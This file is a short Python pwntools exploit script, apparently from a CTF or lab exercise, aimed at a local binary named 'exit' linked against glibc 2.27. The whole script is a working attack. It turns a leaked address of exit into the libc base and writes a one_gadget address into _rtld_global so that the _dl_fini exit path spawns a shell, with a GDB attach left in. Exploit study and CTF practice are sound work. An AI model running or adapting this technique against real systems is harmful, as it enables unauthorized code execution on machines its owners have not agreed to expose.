# use old version of 2.27's libc.so.6
# encoding: utf-8

from pwn import *

libc = ELF('./libc.so.6')


r = process('./exit')

r.recvuntil(' @ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['exit']
print "libc_base @ ", hex(libc_base)

offset = 0x619060 # 因為 _rtld_global 在 ld 段, 所以用 gdb 找偏移量
_rtld_global = libc_base + offset
print "_rtld_global @ ", hex(_rtld_global)
target = _rtld_global + 3848

one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[1]

r.sendlineafter(":", str(target))
gdb.attach(r, 'b *_dl_fini+320\nc')
r.sendlineafter(':', str(one_shot))


r.interactive()
